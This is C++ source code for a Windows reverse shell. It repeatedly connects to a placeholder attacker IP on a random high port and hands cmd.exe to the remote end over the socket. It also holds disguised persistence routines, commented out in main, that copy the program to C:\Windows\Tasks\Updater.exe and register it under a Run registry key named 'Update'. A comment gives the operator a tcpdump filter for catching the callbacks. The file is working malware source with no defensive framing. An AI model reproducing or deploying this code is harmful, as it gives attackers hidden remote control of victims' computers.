#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <tchar.h>
#include <string>
#include <codecvt>
#include <locale>
#include <iostream>
#include <algorithm>
#include <string>
#include <regex>
#include <chrono>
#include <ctime>

using namespace std;
#pragma comment(lib, "Ws2_32.lib")

//REGEXP tcpdump -i ens3 | grep -E '\.1[0-9]{3}\ '
// The exe will moove itself to C:\Windows\Task\Update.exe
// A startup key will be created under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 

#define DEFAULT_BUFLEN 1024
#define BUFSIZE MAX_PATH
void BindSock(char* rhost, int rport);

void MooveExe() {
	char path[MAX_PATH + 1] = "";
	DWORD len = GetCurrentDirectoryA(MAX_PATH, path);
	strcat_s(path, "\\Client_shell.exe");

	cout << path << "\n";

	string str2 = regex_replace(path, std::regex("\\\\"), "\\\\");
	const char* test = str2.c_str();
	cout << test << "\n";
	cout << "Copying to C:\\Windows\\Tasks\\Updater.exe";
	CopyFileA(test, "C:\\Windows\\Tasks\\Updater.exe", true);
}

void CreateKey() {
	std::wstring progPath = L"C:\\Windows\\Tasks\\Updater.exe";
	HKEY hkey = NULL;
	LONG createStatus = RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
	LONG status = RegSetValueEx(hkey, "Update", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
}

void KillProcessById(DWORD pid) {
	HANDLE hnd;
	hnd = OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE, TRUE, pid);
	TerminateProcess(hnd, 0);
}


int main(int argc, char** argv) {								
	//FreeConsole(); // This is the way to make the cmd vanish
	char rhost[] = "xx.xx.xx.xx"; // ip to connect to

	int low_dist = 1100;
	int high_dist = 2000;
	std::srand((unsigned int)std::time(nullptr));
	int port = low_dist + std::rand() % (high_dist - low_dist);
	printf("[*] Using port ... \n");
	cout << port << "\n";
	//Sleep(3000);
	// variables to store date and time components
	int hours, minutes, seconds, day, month, year;

	// time_t is arithmetic time type
	time_t now;
	time(&now);
	struct tm* local = localtime(&now);

	hours = local->tm_hour;          // get hours since midnight (0-23)
	minutes = local->tm_min;         // get minutes passed after the hour (0-59)
	seconds = local->tm_sec;         // get seconds passed after minute (0-59)

	day = local->tm_mday;            // get day of month (1 to 31)
	month = local->tm_mon + 1;       // get month of year (0 to 11)
	year = local->tm_year + 1900;    // get year since 1900

	std::string h = std::to_string(hours);
	std::string m = std::to_string(minutes);


	//MooveExe();
	//CreateKey();
	while (1) {
		BindSock(rhost, port);
		Sleep(3000);
		if (h == "11" && m == "0") {
			printf("[X] Killing process");
			DWORD pid = GetCurrentProcessId();
			KillProcessById(pid);
		}

	}
	return 0;
}



void BindSock(char* rhost, int rport) {

	SECURITY_ATTRIBUTES saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;
	// Initialize Winsock
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR) {
		printf("WSAStartup function failed with error: %d\n", iResult);
		return;
	}
	printf("[*] Winsock init ... \n");
	//init socket props
	SOCKET sock;
	sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	if (sock == INVALID_SOCKET) {
		printf("socket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return;
	}
	printf("[*] Sock init ... \n");
	//Filling struc props
	struct sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	InetPtonA(AF_INET, rhost, &(clientService.sin_addr));
	clientService.sin_port = htons(rport);

	printf("[*] attempting to connect \n");
	iResult = WSAConnect(sock, (SOCKADDR*)&clientService, sizeof(clientService), NULL, NULL, NULL, NULL);
	if (iResult == SOCKET_ERROR) {
		printf("[!] connect function failed with error: %ld\n", WSAGetLastError());
		iResult = closesocket(sock);
		if (iResult == SOCKET_ERROR)
			printf("[!] closesocket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return;
	}
	printf("[X] Sock Connected\n");

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));


	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

	printf("[*] Created process props\n");

	CHAR commandLine[255];
	strcpy_s(commandLine, 255, "cmd.exe");

	CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

}
